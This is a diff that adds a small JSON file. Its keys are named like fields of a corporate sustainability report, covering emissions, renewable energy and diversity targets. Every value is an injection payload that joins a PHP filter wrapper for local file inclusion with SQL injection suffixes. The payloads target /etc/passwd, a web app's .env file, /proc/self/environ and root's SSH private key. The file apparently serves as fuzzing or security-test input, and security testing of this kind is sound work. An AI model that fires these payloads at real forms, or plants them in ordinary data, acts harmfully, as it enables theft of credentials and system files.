@@ -1,0 +1,8 @@
+{
+    "Scope 1, 2, and 3 GHG Emissions Performance": "php://filter/convert.base64-encode/resource=/etc/passwd' OR 1=1; -- ",
+    "GHG Reduction Target": "php://filter/convert.base64-encode/resource=/etc/hostname' UNION SELECT NULL,NULL,NULL--",
+    "Renewable Energy Target (%)": "php://filter/convert.base64-encode/resource=/etc/hosts' ORDER BY 1--",
+    "Waste Diversion Rate Target (%)": "php://filter/convert.base64-encode/resource=/var/www/html/.env' AND 1=1--",
+    "Gender Diversity Target (%) at the Leadership Level": "php://filter/convert.base64-encode/resource=/proc/self/environ' OR 'a'='a--",
+    "Assessment of Current Pay Equity and Inclusive Hiring Practices": "php://filter/convert.base64-encode/resource=/root/.ssh/id_rsa' UNION SELECT 1,2,3--"
+}
